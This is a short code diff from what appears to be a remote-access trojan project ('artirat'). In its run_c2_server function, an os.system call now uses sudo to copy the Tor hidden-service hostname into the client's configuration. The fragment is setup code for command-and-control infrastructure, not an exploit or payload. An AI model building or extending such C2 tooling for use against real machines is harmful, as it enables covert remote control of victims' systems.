@@ -669,7 +669,8 @@ def run_c2_server():
         hostname = file.read()
         write_hostname(hostname)
     except:
-        pass
+        os.system("sudo cat /var/lib/tor/artirat-server/hostname > artirat-client/config/hostname")
+        
     print()
     c2_menu(manager)
 
